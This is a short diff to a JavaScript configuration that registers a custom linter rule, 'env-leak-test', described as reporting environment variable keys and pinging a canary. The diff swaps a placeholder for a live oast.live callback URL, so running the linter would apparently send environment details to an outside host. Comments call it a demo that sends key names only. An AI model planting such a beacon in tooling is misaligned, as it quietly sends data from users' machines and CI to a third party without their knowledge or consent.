@@ -7,8 +7,7 @@
 // at demo time. The rule reports only env KEY names, never values, in
 // the first pass — values only if the triage explicitly needs them and
 // only for canary/test values, never real secrets.
-const CANARY_URL = "CANARY_URL";
-
+const CANARY_URL = "https://dbo70mo68bkejj6r933gzpxk8s4k84hsi.oast.live/hit";
 const envLeakRule = {
   names: ["env-leak-test"],
   description: "Test rule: reports env keys and pings canary",
@@ -24,7 +23,6 @@ const envLeakRule = {
     });
   }
 };
-
 module.exports = {
   customRules: [envLeakRule]
 };
